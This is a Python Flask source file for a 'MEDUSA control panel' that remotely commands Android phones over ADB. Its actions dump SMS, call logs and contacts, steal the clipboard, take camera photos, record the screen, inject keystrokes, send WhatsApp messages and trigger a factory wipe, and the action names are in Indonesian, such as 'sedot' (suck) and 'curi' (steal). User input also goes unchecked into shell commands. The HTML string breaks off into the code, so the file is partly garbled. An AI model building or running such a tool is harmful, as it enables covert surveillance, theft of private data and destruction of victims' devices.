import os, re, time, socket, datetime, subprocess, threading, base64
from flask import Flask, request, redirect, jsonify, render_template_string

app = Flask(__name__)
STORAGE_DIR = "vps_nvme_storage"
LOG_FILE = os.path.join(STORAGE_DIR, "telemetri_automation.txt")
FRAME_FILE = os.path.join(STORAGE_DIR, "latest_diagnostic_frame.txt")
os.makedirs(STORAGE_DIR, exist_ok=True)

CONNECTED_DEVICES, ACTIVE_DEVICE_SERIAL, ADB_PATH = {}, None, "adb"

# --- INTERFACE ENGINE: INSTANT SINGLE-SCREEN VIEWPORT PROTOCOL ---
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MEDUSA CONTROL PANEL // ZERO-TOUCH ENGINE</title>
    <link href="https://jsdelivr.net" rel="stylesheet">
    <link href="https://googleapis.com" rel="stylesheet">
    <style>
        html, body, .wrapper { height: 100vh; overflow: hidden; margin: 0; padding: 0; background-color: #050505; }
        body { color: #00FF00; font-family: 'Fira Code', monospace; font-size: 11px; }
        .wrapper { display: flex; width: 100%; }
        .sidebar { width: 260px; background-color: #0a0a0a; border-right: 1px solid #222; padding: 15px; display: flex; flex-direction: column; height: 100%; justify-content: space-between; }
        .system-title { font-weight: 600; letter-spacing: 1px; color: #FF0000; text-shadow: 0 0 8px rgba(255,0,0,0.3); font-size: 13px; }
        .device-panel { border: 1px solid #333; padding: 8px; border-radius: 4px; background: #0d0d0d; margin-bottom: 12px; }
        .sidebar-btn { background-color: transparent; color: #aaa; border: 1px solid #232323; border-radius: 4px; padding: 6px; font-weight: 600; font-size: 10px; transition: all 0.2s; width: 100%; margin-bottom: 5px; text-transform: uppercase; }
        .sidebar-btn:hover { border-color: #FF0000; color: #fff; background: rgba(139,0,0,0.1); }
        .main-panel { flex: 1; padding: 15px; display: flex; flex-direction: column; gap: 10px; height: 100%; }
        .panel-header { border-bottom: 1px solid #222; padding-bottom: 5px; display: flex; justify-content: space-between; align-items: center; }
        .nav-tabs { border-bottom: 1px solid #333; gap: 2px; }
        .nav-tabs .nav-link { color: #555; background: transparent; border: 1px solid transparent; border-radius: 4px 4px 0 0; padding: 4px 10px; font-weight: 600; font-size: 10px; }
        .nav-tabs .nav-link.active { color: #fff !important; background-color: #0d0d0d !important; border-color: #FF0000 #FF0000 transparent !important; text-shadow: 0 0 5px #FF0000; }
        .tab-content { background-color: #0a0a0a; border: 1px solid #FF0000; border-radius: 0 4px 4px 4px; padding: 12px; flex: 1; min-height: 0; overflow-y: auto; }
        .grid-btn { background: #0d0d0d; color: #00FF00; border: 1px solid #222; border-radius: 4px; padding: 8px 10px; text-align: left; transition: all 0.15s; font-size: 11px; display: flex; justify-content: space-between; align-items: center; width: 100%; margin-bottom: 6px; }
        .grid-btn::after { content: '➔'; color: #333; font-size: 8px; }
        .grid-btn:hover { border-color: #00FF00; background: rgba(0,255,0,0.01); }
        .grid-btn:hover::after { color: #00FF00; }
        .grid-btn-danger { color: #FF3333; }
        .grid-btn-danger:hover { border-color: #FF3333; background: rgba(255,51,51,0.01); }
        .bottom-row { display: flex; gap: 15px; height: 160px; min-height: 160px; }
        .console-card { background-color: #0a0a0a; border: 1px solid #222; border-radius: 4px; flex: 1; display: flex; flex-direction: column; overflow: hidden; }
        .console-header { background: #0d0d0d; border-bottom: 1px solid #222; padding: 4px 10px; font-size: 9px; color: #666; font-weight: 600; display: flex; justify-content: space-between; }
        .log-textbox { background-color: #050505; color: #00FF00; overflow-y: auto; padding: 8px; font-size: 11px; line-height: 1.4; flex: 1; list-style: none; margin: 0; }
        .stream-card { width: 280px; background-color: #0a0a0a; border: 1px solid #222; border-radius: 4px; display: flex; flex-direction: column; overflow: hidden; }
        .stream-box { background: #000; flex: 1; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        .stream-view { width: 100%; height: 100%; object-fit: contain; }
        .status-dot { width: 4px; height: 4px; background-color: #00FF00; border-radius: 50%; display: inline-block; margin-right: 4px; box-shadow: 0 0 6px #00FF00; }
    </style>
</head>
@app.route('/')
def home(): 
    return redirect('/operator/dashboard')

@app.route('/operator/dashboard')
def operator_dashboard(): 
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/get-telemetry-log')
def get_telemetry_log():
    global CONNECTED_DEVICES, ACTIVE_DEVICE_SERIAL
    logs = ["// SYSTEM SECURE ONLINE // CHANNEL READY"]
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f: logs = f.read().splitlines()[-10:]
    details = "MANUFACTURER : N/A\\nMODEL ENGINE : N/A\\nBATTERY SYS  : N/A"
    if ACTIVE_DEVICE_SERIAL and ACTIVE_DEVICE_SERIAL in CONNECTED_DEVICES:
        d = CONNECTED_DEVICES[ACTIVE_DEVICE_SERIAL]
        details = f"PABRIKAN : {d.get('manufacturer')}\\nMODEL    : {d.get('model')}\\nBATTERY  : {d.get('battery')}%"
    return jsonify({"logs": logs, "devices": list(CONNECTED_DEVICES.keys()) if CONNECTED_DEVICES else [], "active": ACTIVE_DEVICE_SERIAL, "details": details})

@app.route('/api/switch-device', methods=['POST'])
def switch_device():
    global ACTIVE_DEVICE_SERIAL
    data = request.json
    if data and 'serial' in data:
        ACTIVE_DEVICE_SERIAL = data['serial']
        return jsonify({"status": "success"})
    return jsonify({"status": "failed"}), 400

@app.route('/receive_frame', methods=['POST'])
def receive_frame():
    try:
        base64_data = request.data.decode('utf-8')
        if base64_data:
            with open(FRAME_FILE, "w") as f: f.write(base64_data)
            return "OK", 200
    except Exception: pass
    return "Failed", 400

@app.route('/api/get-latest-frame')
def get_latest_frame():
    if os.path.exists(FRAME_FILE):
        with open(FRAME_FILE, "r") as f:
            base64_data = f.read()
            if "," in base64_data:
                try:
                    header, encoded = base64_data.split(",", 1)
                    return base64.b64decode(encoded), 200, {'Content-Type': 'image/jpeg'}
                except Exception: pass
    return base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"), 200, {'Content-Type': 'image/gif'}

@app.route('/api/execute-action', methods=['POST'])
def execute_action():
    global ACTIVE_DEVICE_SERIAL
    data = request.json
    if not data or 'action' not in data: return jsonify({"status": "error"}), 400
    action, val = data['action'], data.get('value', '')
    pfx = f"{ADB_PATH} -s {ACTIVE_DEVICE_SERIAL}" if ACTIVE_DEVICE_SERIAL else ADB_PATH
    cmd = ""
    if action == "sedot-sms": cmd = f"{pfx} shell content query --uri content://sms/"
    elif action == "sedot-calls": cmd = f"{pfx} shell content query --uri content://call_log/calls"
    elif action == "sedot-kontak": cmd = f"{pfx} shell content query --uri content://com.android.contacts/data"
    elif action == "daftar-apps": cmd = f"{pfx} shell pm list packages -f"
    elif action == "curi-clipboard": cmd = f"{pfx} shell service call clipboard 2"
    elif action == "info-baterai": cmd = f"{pfx} shell dumpsys battery"
    elif action == "lokasi-maps": cmd = f'{pfx} shell am start -a android.intent.action.VIEW -d "geo:{val}"'
    elif action == "buka-wa": cmd = f"{pfx} shell monkey -p com.whatsapp 1"
    elif action == "ketik-wa": cmd = f'{pfx} shell am start -a android.intent.action.VIEW -d "https://wa.me{val}?text=SystemSync"'
    elif action == "buka-link": cmd = f'{pfx} shell am start -a android.intent.action.VIEW -d "{val}"'
    elif action == "putar-musik": cmd = f'{pfx} shell am start -a android.intent.action.VIEW -d "{val}" -t "audio/*"'
    elif action == "kirim-toast": cmd = f"{pfx} shell am broadcast -a com.android.systemui.demo -e command toast -e text 'Matrix_Online'"
    elif action == "getar-hp": cmd = f"{pfx} shell cmd vibrator vibrate 5000"
    elif action == "mainkan-alarm": cmd = f"{pfx} shell am start -a android.intent.action.VIEW -d content://settings/system/alarm_alert -t audio/*"
    elif action == "stop-suara": cmd = f"{pfx} shell input keyevent 127"
    elif action == "foto-depan": cmd = f"{pfx} shell am start -a android.media.action.IMAGE_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA true"
    elif action == "foto-belakang": cmd = f"{pfx} shell am start -a android.media.action.IMAGE_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA false"
    elif action == "screenshot":
        ts = datetime.datetime.now().strftime('%H%M%S')
        cmd = f"{pfx} shell screencap -p /sdcard/s.png && adb pull /sdcard/s.png {STORAGE_DIR}/scr_{ts}.png"
    elif action == "screenrecord": cmd = f"{pfx} shell screenrecord --time-limit 15 /sdcard/r.mp4"
    elif action == "injeksi-keyboard": cmd = f'{pfx} shell input text "{val.replace(" ", "%s")}"'
    elif action == "layar-nyala": cmd = f"{pfx} shell input keyevent 224"
    elif action == "reboot": cmd = f"{pfx} reboot"
    elif action == "power-off": cmd = f"{pfx} reboot -p"
    elif action == "wipe-data": cmd = f"{pfx} shell am broadcast -a android.intent.action.MASTER_CLEAR"
    else: return jsonify({"status": "ignored"})
    def run_sub():
        try:
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')
            ts = datetime.datetime.now().strftime("%H:%M:%S")
            with open(LOG_FILE, "a") as f: f.write(f"[{ts}] RECON // {action.upper()} Executed (Code: {res.returncode})\\n")
        except Exception: pass
    threading.Thread(target=run_sub, daemon=True).start()
    return jsonify({"status": "success"})

def adb_device_tracker_daemon():
    global CONNECTED_DEVICES, ACTIVE_DEVICE_SERIAL
    while True:
        try:
            out = subprocess.run(f"{ADB_PATH} devices", shell=True, capture_output=True, text=True).stdout
            lines = [line.split('\t') for line in out.strip().split('\n')[1:] if '\tdevice' in line]
            new_devs = {}
            for s_arr in lines:
                serial = s_arr[0]
                if serial in CONNECTED_DEVICES: new_devs[serial] = CONNECTED_DEVICES[serial]
                else:
                    p = f"{ADB_PATH} -s {serial}"
                    mnf = subprocess.run(f"{p} shell getprop ro.product.manufacturer", shell=True, capture_output=True, text=True).stdout.strip().capitalize()
                    mdl = subprocess.run(f"{p} shell getprop ro.product.model", shell=True, capture_output=True, text=True).stdout.strip()
                    new_devs[serial] = {"manufacturer": mnf if mnf else "NODE", "model": mdl if mdl else "UNKNOWN", "battery": "100"}
                    ACTIVE_DEVICE_SERIAL = serial
            CONNECTED_DEVICES = new_devs
        except Exception: pass
        time.sleep(5)

if __name__ == '__main__':
    threading.Thread(target=adb_device_tracker_daemon, daemon=True).start()
    app.run(host='0.0.0.0', port=80)
